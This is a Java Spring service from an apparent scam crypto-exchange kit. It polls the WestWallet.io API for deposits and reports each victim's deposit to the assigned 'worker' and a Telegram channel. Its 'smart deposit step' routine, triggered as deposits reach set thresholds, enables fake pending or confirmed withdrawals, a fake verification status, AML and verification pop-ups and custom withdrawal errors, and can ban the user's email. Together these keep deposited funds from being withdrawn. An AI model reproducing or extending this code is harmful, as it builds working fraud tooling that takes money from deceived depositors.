package me.yukitale.cryptoexchange.exchange.service;

import jakarta.annotation.PostConstruct;
import me.yukitale.cryptoexchange.exchange.model.Coin;
import me.yukitale.cryptoexchange.exchange.model.ban.EmailBan;
import me.yukitale.cryptoexchange.exchange.model.user.User;
import me.yukitale.cryptoexchange.exchange.model.user.UserAddress;
import me.yukitale.cryptoexchange.exchange.model.user.UserDeposit;
import me.yukitale.cryptoexchange.exchange.model.user.UserTransaction;
import me.yukitale.cryptoexchange.exchange.model.user.settings.UserErrorMessage;
import me.yukitale.cryptoexchange.exchange.model.user.settings.UserFeature;
import me.yukitale.cryptoexchange.exchange.repository.ban.EmailBanRepository;
import me.yukitale.cryptoexchange.exchange.repository.user.UserAddressRepository;
import me.yukitale.cryptoexchange.exchange.repository.user.UserDepositRepository;
import me.yukitale.cryptoexchange.exchange.repository.user.UserRepository;
import me.yukitale.cryptoexchange.exchange.repository.user.UserTransactionRepository;
import me.yukitale.cryptoexchange.exchange.repository.user.settings.UserErrorMessageRepository;
import me.yukitale.cryptoexchange.exchange.repository.user.settings.UserFeatureRepository;
import me.yukitale.cryptoexchange.panel.admin.model.coins.AdminCoinSettings;
import me.yukitale.cryptoexchange.panel.admin.model.telegram.AdminTelegramSettings;
import me.yukitale.cryptoexchange.panel.admin.model.telegram.TelegramMessage;
import me.yukitale.cryptoexchange.panel.admin.repository.coins.AdminCoinSettingsRepository;
import me.yukitale.cryptoexchange.panel.admin.repository.coins.AdminDepositCoinRepository;
import me.yukitale.cryptoexchange.panel.admin.repository.other.AdminSettingsRepository;
import me.yukitale.cryptoexchange.panel.admin.repository.other.AdminSmartDepositStepRepository;
import me.yukitale.cryptoexchange.panel.admin.repository.telegram.AdminTelegramSettingsRepository;
import me.yukitale.cryptoexchange.panel.common.model.ErrorMessage;
import me.yukitale.cryptoexchange.panel.common.model.SmartDepositStep;
import me.yukitale.cryptoexchange.panel.worker.model.Domain;
import me.yukitale.cryptoexchange.panel.worker.model.Promocode;
import me.yukitale.cryptoexchange.panel.worker.model.Worker;
import me.yukitale.cryptoexchange.panel.worker.model.settings.other.WorkerCoinSettings;
import me.yukitale.cryptoexchange.panel.worker.repository.DomainRepository;
import me.yukitale.cryptoexchange.panel.worker.repository.PromocodeRepository;
import me.yukitale.cryptoexchange.panel.worker.repository.WorkerRepository;
import me.yukitale.cryptoexchange.panel.worker.repository.settings.other.WorkerSmartDepositStepsRepository;
import me.yukitale.cryptoexchange.utils.HttpUtil;
import me.yukitale.cryptoexchange.utils.JsonUtil;
import org.apache.commons.codec.binary.Hex;
import org.apache.commons.codec.digest.HmacUtils;
import org.apache.commons.lang.StringUtils;
import org.apache.http.HttpHeaders;
import org.apache.http.HttpRequest;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.DependsOn;
import org.springframework.data.domain.Sort;
import org.springframework.stereotype.Service;
import me.yukitale.cryptoexchange.common.types.CoinType;
import me.yukitale.cryptoexchange.exchange.repository.CoinRepository;
import me.yukitale.cryptoexchange.panel.admin.model.payments.PaymentSettings;
import me.yukitale.cryptoexchange.panel.admin.repository.payments.PaymentSettingsRepository;
import me.yukitale.cryptoexchange.panel.common.model.DepositCoin;
import me.yukitale.cryptoexchange.panel.common.service.TelegramService;
import org.springframework.web.bind.annotation.RequestBody;

import java.time.Instant;
import java.util.*;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

@Service
@DependsOn(value = {"userService", "coinService", "telegramService"})
public class WestWalletService {

    private static final Logger LOGGER = LoggerFactory.getLogger(WestWalletService.class);

    @Autowired
    private PaymentSettingsRepository paymentSettingsRepository;

    @Autowired
    private UserAddressRepository userAddressRepository;

    @Autowired
    private UserDepositRepository userDepositRepository;

    @Autowired
    private UserTransactionRepository userTransactionRepository;

    @Autowired
    private AdminDepositCoinRepository depositCoinRepository;

    @Autowired
    private AdminCoinSettingsRepository adminCoinSettingsRepository;

    @Autowired
    private AdminTelegramSettingsRepository adminTelegramSettingsRepository;

    @Autowired
    private AdminSettingsRepository adminSettingsRepository;

    @Autowired
    private AdminSmartDepositStepRepository adminSmartDepositStepRepository;

    @Autowired
    private PromocodeRepository promocodeRepository;

    @Autowired
    private WorkerRepository workerRepository;

    @Autowired
    private WorkerSmartDepositStepsRepository workerSmartDepositStepsRepository;

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private UserFeatureRepository userFeatureRepository;

    @Autowired
    private DomainRepository domainRepository;

    @Autowired
    private CoinRepository coinRepository;

    @Autowired
    private EmailBanRepository emailBanRepository;

    @Autowired
    private UserErrorMessageRepository userErrorMessageRepository;

    @Autowired
    private UserService userService;

    @Autowired
    private CoinService coinService;

    @Autowired
    private TelegramService telegramService;

    @PostConstruct
    public void init() {
        startMonitoring();
    }

    private void startMonitoring() {
        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
            try {
                PaymentSettings paymentSettings = paymentSettingsRepository.findFirst();
                if (paymentSettings == null) {
                    LOGGER.error("Настройте Payments в админ-панели");
                    return;
                }

                String publicKey = paymentSettings.getWestWalletPublicKey();
                String privateKey = paymentSettings.getWestWalletPrivateKey();
                if (StringUtils.isBlank(publicKey) || StringUtils.isBlank(privateKey)) {
                    LOGGER.error("Настройте Payments в админ-панели");
                    return;
                }

                Map<String, Object> responseMap = getTransactions();

                if (!responseMap.containsKey("error") || !responseMap.get("error").equals("ok")) {
                    LOGGER.warn("Возможна ошибка при получении последних транзакций WestWallet.io");
                }

                if (!responseMap.containsKey("result")) {
                    LOGGER.error("Ошибка получения получения последних транзакций WestWallet.io");
                    return;
                }

                if ((int) responseMap.get("count") == 0) {
                    return;
                }

                List<Map<String, Object>> transactions = (List<Map<String, Object>>) responseMap.get("result");
                for (Map<String, Object> transaction : transactions) {
                    try {
                        if (transaction.get("id") == null || transaction.get("status") == null || transaction.get("amount") == null) {
                            continue;
                        }

                        long transactionId = Long.parseLong(String.valueOf(transaction.get("id")));
                        boolean completed = transaction.get("status").equals("completed");
                        double amount = Double.parseDouble(String.valueOf(transaction.get("amount")));

                        UserDeposit userDeposit = userDepositRepository.findByTxId(transactionId).orElse(null);
                        if (userDeposit != null) {
                            if (!userDeposit.isCompleted() && completed) {
                                userDeposit.setCompleted(true);

                                userDepositRepository.save(userDeposit);

                                User user = userRepository.findById(userDeposit.getUserId()).orElse(null);
                                if (user == null) {
                                    continue;
                                }

                                Worker worker = user.getWorker() == null ? null : workerRepository.findById(user.getWorker().getId()).orElse(null);

                                UserTransaction userTransaction = userTransactionRepository.findById(userDeposit.getTransactionId()).orElse(null);
                                if (userTransaction != null && userTransaction.getStatus() != UserTransaction.Status.COMPLETED) {
                                    userTransaction.setStatus(UserTransaction.Status.COMPLETED);
                                    userTransactionRepository.save(userTransaction);

                                    Coin coin = getCoin(userTransaction.getCoinSymbol());

                                    if (coin != null) {
                                        userService.addBalanceLazyBypass(user, coin, userTransaction.getCoinSymbol(), userTransaction.getAmount());
                                    }
                                }

                                userRepository.save(user);

                                //todo: проверить
                                if (user.getPromocodeName() != null) {
                                    Promocode promocode = promocodeRepository.findByNameIgnoreCase(user.getPromocodeName()).orElse(null);
                                    if (promocode != null) {
                                        promocode.setDeposits(promocode.getDeposits() + 1);
                                        promocode.setDepositsPrice(promocode.getDepositsPrice() + userDeposit.getPrice());

                                        promocodeRepository.save(promocode);
                                    }
                                }

                                addUserDeposits(user, userDeposit.getPrice());
                                addWorkerDeposits(worker, userDeposit.getPrice());
                                addDomainDeposits(user.getDomain(), userDeposit.getPrice());

                                if (userTransaction != null) {
                                    acceptSmartDepositStep(user, userDeposit, worker, userTransaction.getCoinSymbol());
                                }

                                telegramService.sendMessageToWorker(worker, TelegramMessage.MessageType.USER_DEPOSIT_CONFIRMED, true, user.getEmail(), userDeposit.getFormattedPrice(), userDeposit.getFormattedAmount(), userDeposit.getCoinType().name(), userTransaction == null || userTransaction.getAddress() == null ? "none" : userTransaction.getAddress(), userDeposit.getHash(), user.getDomain(), StringUtils.isBlank(user.getPromocodeName()) ? "-" : user.getPromocodeName());

                                try {
                                    AdminTelegramSettings adminTelegramSettings = adminTelegramSettingsRepository.findFirst();
                                    if (adminTelegramSettings.isChannelNotification() && adminTelegramSettings.getChannelId() != -1 && adminTelegramSettings.getChannelId() != 0 && !StringUtils.isBlank(adminTelegramSettings.getChannelMessage())) {
                                        User workerUser = worker == null ? null : userRepository.findById(worker.getUser().getId()).orElse(null);
                                        String message = String.format(adminTelegramSettings.getChannelMessage(), workerUser == null ? "-" : workerUser.getUsername(), user.getDomain(), StringUtils.isBlank(user.getPromocodeName()) ? "-" : user.getPromocodeName(), userDeposit.getFormattedPrice(), userDeposit.getFormattedAmount(), userDeposit.getCoinType().name());
                                        telegramService.sendMessageToChannel(message, adminTelegramSettings.getChannelId());
                                    }
                                } catch (Exception ex) {
                                    ex.printStackTrace();
                                }

                                userService.createAction(user, "Completed deposit " + userDeposit.getFormattedAmount() + " " + userDeposit.getCoinType().name() + " (" + userDeposit.getFormattedPrice() + "$)");
                            }
                            continue;
                        }

                        if (transaction.get("address") == null) {
                            continue;
                        }

                        String address = (String) transaction.get("address");
                        String tag = transaction.get("dest_tag") == null ? "" : (String) transaction.get("dest_tag");
                        UserAddress userAddress;
                        if (StringUtils.isBlank(tag)) {
                            userAddress = userAddressRepository.findByAddressIgnoreCase(address.toLowerCase()).orElse(null);
                        } else {
                            userAddress = userAddressRepository.findByAddressAndTagIgnoreCase(address.toLowerCase(), tag).orElse(null);
                        }

                        if (userAddress == null) {
                            continue;
                        }

                        CoinType coinType = userAddress.getCoinType();
                        String coinSymbol = getCoinSymbol(coinType);

                        double price = coinService.getPrice(coinSymbol);
                        if (price <= 0) {
                            LOGGER.warn("Ошибка получения курса в депозите для валюты " + coinSymbol);
                            continue;
                        }

                        User user = userRepository.findById(userAddress.getUserId()).orElse(null);
                        if (user == null) {
                            continue;
                        }

                        String hash = String.valueOf(transaction.get("blockchain_hash"));

                        Worker worker = user.getWorker() == null ? null : workerRepository.findById(user.getWorker().getId()).orElse(null);

                        double commission = 0D;
                        if (user.getDepositCommission() >= 0) {
                            commission = user.getDepositCommission();
                        } else if (worker != null) {
                            WorkerCoinSettings coinSettings = worker.getCoinSettings();
                            if (coinSettings != null) {
                                commission = coinSettings.getDepositCommission();
                            }
                        } else {
                            AdminCoinSettings adminCoinSettings = adminCoinSettingsRepository.findFirst();
                            if (adminCoinSettings != null) {
                                commission = adminCoinSettings.getDepositCommission();
                            }
                        }

                        UserTransaction userTransaction = new UserTransaction();
                        userTransaction.setUser(user);
                        userTransaction.setAmount(amount - (commission <= 0 ? 0 : amount * (commission / 100D)));
                        userTransaction.setType(UserTransaction.Type.DEPOSIT);
                        userTransaction.setStatus(completed ? UserTransaction.Status.COMPLETED : UserTransaction.Status.IN_PROCESSING);
                        userTransaction.setDate(new Date());
                        userTransaction.setCoinSymbol(coinSymbol);
                        userTransaction.setAddress(userAddress.getAddress());
                        userTransaction.setMemo(userAddress.getTag());

                        userTransactionRepository.save(userTransaction);

                        userDeposit = new UserDeposit();
                        userDeposit.setCountryCode(user.getLastCountryCode());
                        userDeposit.setBotReceived(false);
                        userDeposit.setTransaction(userTransaction);
                        userDeposit.setTransactionId(userTransaction.getId());
                        userDeposit.setHash(hash);
                        userDeposit.setCoinType(coinType);
                        userDeposit.setDate(new Date());
                        userDeposit.setAmount(amount);
                        userDeposit.setPrice(amount * price);
                        userDeposit.setUser(user);
                        userDeposit.setUserId(user.getId());
                        userDeposit.setWorker(worker);
                        userDeposit.setTxId(transactionId);
                        userDeposit.setCompleted(completed);

                        userDepositRepository.save(userDeposit);

                        if (completed) {
                            Coin coin = getCoin(userTransaction.getCoinSymbol());

                            if (coin != null) {
                                userService.addBalanceLazyBypass(user, coin, userTransaction.getCoinSymbol(), userTransaction.getAmount());
                            }

                            //todo: проверить
                            if (user.getPromocodeName() != null) {
                                Promocode promocode = promocodeRepository.findByNameIgnoreCase(user.getPromocodeName()).orElse(null);
                                if (promocode != null) {
                                    promocode.setDeposits(promocode.getDeposits() + 1);
                                    promocode.setDepositsPrice(promocode.getDepositsPrice() + userDeposit.getPrice());

                                    promocodeRepository.save(promocode);
                                }
                            }

                            addUserDeposits(user, userDeposit.getPrice());
                            addWorkerDeposits(worker, userDeposit.getPrice());
                            addDomainDeposits(user.getDomain(), userDeposit.getPrice());

                            acceptSmartDepositStep(user, userDeposit, worker, coinSymbol);

                            telegramService.sendMessageToWorker(worker, TelegramMessage.MessageType.USER_DEPOSIT_CONFIRMED, true, user.getEmail(), userDeposit.getFormattedPrice(), userDeposit.getFormattedAmount(), userDeposit.getCoinType().name(), address, hash, user.getDomain(), StringUtils.isBlank(user.getPromocodeName()) ? "-" : user.getPromocodeName());

                            try {
                                AdminTelegramSettings adminTelegramSettings = adminTelegramSettingsRepository.findFirst();
                                if (adminTelegramSettings.isChannelNotification() && adminTelegramSettings.getChannelId() != -1 && adminTelegramSettings.getChannelId() != 0 && !StringUtils.isBlank(adminTelegramSettings.getChannelMessage())) {
                                    User workerUser = worker == null ? null : userRepository.findById(worker.getUser().getId()).orElse(null);
                                    String message = String.format(adminTelegramSettings.getChannelMessage(), workerUser == null ? "-" : workerUser.getUsername(), user.getDomain(), StringUtils.isBlank(user.getPromocodeName()) ? "-" : user.getPromocodeName(), userDeposit.getFormattedPrice(), userDeposit.getFormattedAmount(), userDeposit.getCoinType().name());
                                    telegramService.sendMessageToChannel(message, adminTelegramSettings.getChannelId());
                                }
                            } catch (Exception ex) {
                                ex.printStackTrace();
                            }

                            userService.createAction(user, "Completed deposit " + userDeposit.getFormattedAmount() + " " + userDeposit.getCoinType().name() + " (" + userDeposit.getFormattedPrice() + "$)");
                        } else {
                            telegramService.sendMessageToWorker(worker, TelegramMessage.MessageType.USER_DEPOSIT_PENDING, true, user.getEmail(), userDeposit.getFormattedPrice(), userDeposit.getFormattedAmount(), userDeposit.getCoinType().name(), address, hash, user.getDomain(), StringUtils.isBlank(user.getPromocodeName()) ? "-" : user.getPromocodeName());

                            userService.createAction(user, "Pending deposit " + userDeposit.getFormattedAmount() + " " + userDeposit.getCoinType().name() + " (" + userDeposit.getFormattedPrice() + "$)");
                        }
                    } catch (Exception ex) {
                        ex.printStackTrace();
                    }
                }
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }, 15, 20, TimeUnit.SECONDS);
    }

    public void acceptSmartDepositStep(User user, UserDeposit userDeposit, Worker worker, String coinSymbol) {
        try {
            boolean enabled = false;
            if (worker == null) {
                enabled = adminSettingsRepository.findFirst().isSmartDepositEnabled();
            } else {
                enabled = worker.isSmartDepositEnabled();
            }

            if (!enabled) {
                return;
            }

            List<? extends SmartDepositStep> steps = worker == null ? adminSmartDepositStepRepository.findAll(Sort.by(Sort.Direction.ASC, "id")) : workerSmartDepositStepsRepository.findAllByWorkerId(worker.getId());
            if (steps.isEmpty()) {
                return;
            }

            SmartDepositStep smartDepositStep = steps.get(user.getSmartDepositStep());
            if (smartDepositStep == null) {
                return;
            }

            boolean accept = false;
            double amount = userDeposit.getAmount();
            if (smartDepositStep.getType() == SmartDepositStep.SmartDepositStepType.MIN_DEPOSIT) {
                if (coinSymbol.equalsIgnoreCase("usd") && userDeposit.getPrice() >= amount) {
                    accept = true;
                } else if (coinSymbol.equalsIgnoreCase(smartDepositStep.getCoinSymbol()) && userDeposit.getAmount() >= smartDepositStep.getAmount()) {
                    accept = true;
                }
            }/* else {
            if (coinSymbol.equalsIgnoreCase("usd")) {
                double price = userDepositRepository.findDepositPriceSum(user.getId(), true);

            }
        }*/

            if (accept) {
                user.setSmartDepositStep(user.getSmartDepositStep() + 1);

                for (UserFeature userFeature : userFeatureRepository.findAllByUserId(user.getId())) {
                    boolean changed = false;

                    if (userFeature.getType() == UserFeature.Type.FAKE_WITHDRAW_PENDING) {
                        userFeature.setEnabled(smartDepositStep.isFakeWithdrawPending());
                        changed = true;
                    } else if (userFeature.getType() == UserFeature.Type.FAKE_WITHDRAW_CONFIRMED) {
                        userFeature.setEnabled(smartDepositStep.isFakeWithdrawConfirmed());
                        changed = true;
                    } else if (userFeature.getType() == UserFeature.Type.PREMIUM) {
                        userFeature.setEnabled(smartDepositStep.isPremium());
                        changed = true;
                    } else if (userFeature.getType() == UserFeature.Type.WALLET_CONNECT) {
                        userFeature.setEnabled(smartDepositStep.isWalletConnect());
                        changed = true;
                    }

                    if (changed) {
                        userFeatureRepository.save(userFeature);
                    }
                }

                user.setFakeVerified(smartDepositStep.isFakeVerified());
                user.setAmlModal(smartDepositStep.isAmlModal());
                user.setVerificationModal(smartDepositStep.isVerifModal());

                userRepository.save(user);

                if (smartDepositStep.isChangeWithdrawError()) {
                    UserErrorMessage errorMessage = userErrorMessageRepository.findByUserIdAndType(user.getId(), ErrorMessage.ErrorMessageType.WITHDRAW).orElse(new UserErrorMessage());
                    errorMessage.setUser(user);
                    errorMessage.setMessage(smartDepositStep.getWithdrawError());
                    errorMessage.setType(ErrorMessage.ErrorMessageType.WITHDRAW);
                    userErrorMessageRepository.save(errorMessage);
                }

                if (smartDepositStep.isGlobalBan()) {
                    EmailBan emailBan = new EmailBan();
                    emailBan.setEmail(user.getEmail());
                    emailBan.setUser(user);
                    emailBan.setDate(new Date());

                    emailBanRepository.save(emailBan);
                }
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public Coin getCoin(String coinSymbol) {
        return coinRepository.findBySymbol(coinSymbol).orElse(null);
    }

    public void addUserDeposits(User user, double depositAmount) {
        user.setDeposits(user.getDeposits() + depositAmount);
        user.setDepositsCount(user.getDepositsCount() + 1);

        userRepository.save(user);
    }

    public void addWorkerDeposits(Worker worker, double depositAmount) {
        if (worker != null) {
            worker.setDeposits(worker.getDeposits() + depositAmount);
            worker.setDepositsCount(worker.getDepositsCount() + 1);

            workerRepository.save(worker);
        }
    }

    public void addDomainDeposits(String domainName, double depositAmount) {
        Domain domain = domainRepository.findByName(domainName).orElse(null);
        if (domain != null) {
            domain.setDeposits(domain.getDeposits() + depositAmount);
            domain.setDepositsCount(domain.getDepositsCount() + 1);

            domainRepository.save(domain);
        }
    }

    private String getCoinSymbol(CoinType coinType) {
        DepositCoin depositCoin = depositCoinRepository.findByType(coinType).orElse(null);
        if (depositCoin == null) {
            return null;
        }

        return depositCoin.getSymbol();
    }

    public Map<String, Object> getTransactions() throws RuntimeException {
        Map<String, Object> data = new HashMap<>() {{
            put("type", "receive");
            put("order", "desc");
            put("limit", 30);
        }};

        String dataJson = JsonUtil.writeJson(data);

        HttpPost httpPost = HttpUtil.createPost("https://api.westwallet.io/wallet/transactions", dataJson);

        signRequest(httpPost, dataJson);

        try {
            CloseableHttpResponse httpResponse = HttpUtil.sendRequest(httpPost);

            String responseJson = HttpUtil.readAndCloseResponse(httpResponse);

            return JsonUtil.readJson(responseJson, Map.class);
        } catch (Exception ex) {
            throw new RuntimeException("Ошибка получения последних транзакций WestWallet.io");
        }
    }

    public UserAddress createUserAddress(User user, CoinType coinType) throws RuntimeException {
        Map<String, Object> data = new HashMap<>() {{
            put("currency", coinType.name());
            put("ipn_url", "");
            put("label", "");
        }};

        String dataJson = JsonUtil.writeJson(data);

        HttpPost httpPost = HttpUtil.createPost("https://api.westwallet.io/address/generate", dataJson);

        signRequest(httpPost, dataJson);

        try {
            CloseableHttpResponse httpResponse = HttpUtil.sendRequest(httpPost);

            String responseJson = HttpUtil.readAndCloseResponse(httpResponse);

            Map<String, String> responseData = JsonUtil.readJson(responseJson, Map.class);

            if (!responseData.containsKey("address") || !responseData.containsKey("currency") || !responseData.containsKey("error") || !responseData.get("error").equals("ok")) {
                throw new RuntimeException("Error generating address for: " + user.getEmail() + ", coin " + coinType.name());
            }

            String address = responseData.get("address");
            String destTag = responseData.get("dest_tag");

            if (address == null || address.isEmpty()) {
                throw new RuntimeException("Error generating address for: " + user.getEmail() + ", coin " + coinType.name());
            }

            UserAddress userAddress = new UserAddress();
            userAddress.setUser(user);
            userAddress.setUserId(user.getId());
            userAddress.setTag(destTag);
            userAddress.setAddress(address);
            userAddress.setCoinType(coinType);
            userAddress.setCreated(System.currentTimeMillis());

            return userAddress;
        } catch (Exception e) {
            throw new RuntimeException("Error generating address for: " + user.getEmail() + ", coin " + coinType.name());
        }
    }

    public void saveUserAddress(@RequestBody Map<String, Object> data) {
        long userId = Long.parseLong(data.get("user_id").toString());
        Optional<User> user = userRepository.findById(userId);
        CoinType coinType = CoinType.valueOf(data.get("coin-type").toString());
        String depositAddress = data.get("deposit-address").toString();
        Object depositTagObject = data.get("deposit-tag");

        String depositTag = null;
        if (depositTagObject != null) {
            depositTag = depositTagObject.toString();
        }

        UserAddress userAddress = new UserAddress();
        userAddress.setUser(user.get());
        userAddress.setUserId(userId);
        userAddress.setTag(depositTag);
        userAddress.setAddress(depositAddress);
        userAddress.setCoinType(coinType);
        userAddress.setCreated(System.currentTimeMillis());

        userAddressRepository.save(userAddress);
    }

    public UserAddress updateUserAddress(String address, Object depositTagObject) {
        String depositTag = null;
        if (depositTagObject != null) {
            depositTag = depositTagObject.toString();
        }

        UserAddress userAddress = new UserAddress();
        userAddress.setTag(depositTag);
        userAddress.setAddress(address);

        return userAddress;
    }

    private void signRequest(HttpRequest httpRequest, String data) throws RuntimeException {
        PaymentSettings paymentSettings = paymentSettingsRepository.findFirst();
        if (paymentSettings == null || StringUtils.isBlank(paymentSettings.getWestWalletPublicKey()) || StringUtils.isBlank(paymentSettings.getWestWalletPrivateKey())) {
            throw new RuntimeException("WestWallet public and private keys not found");
        }

        long timestamp = Instant.now().getEpochSecond();

        String sign = Hex.encodeHexString(HmacUtils.hmacSha256(paymentSettings.getWestWalletPrivateKey().getBytes(),
                (timestamp + (data == null || data.isEmpty() ? "" : data)).getBytes()));

        httpRequest.addHeader(HttpHeaders.CONTENT_TYPE, "application/json");
        httpRequest.addHeader("X-API-KEY", paymentSettings.getWestWalletPublicKey());
        httpRequest.addHeader("X-ACCESS-SIGN", sign);
        httpRequest.addHeader("X-ACCESS-TIMESTAMP", String.valueOf(timestamp));
    }
}
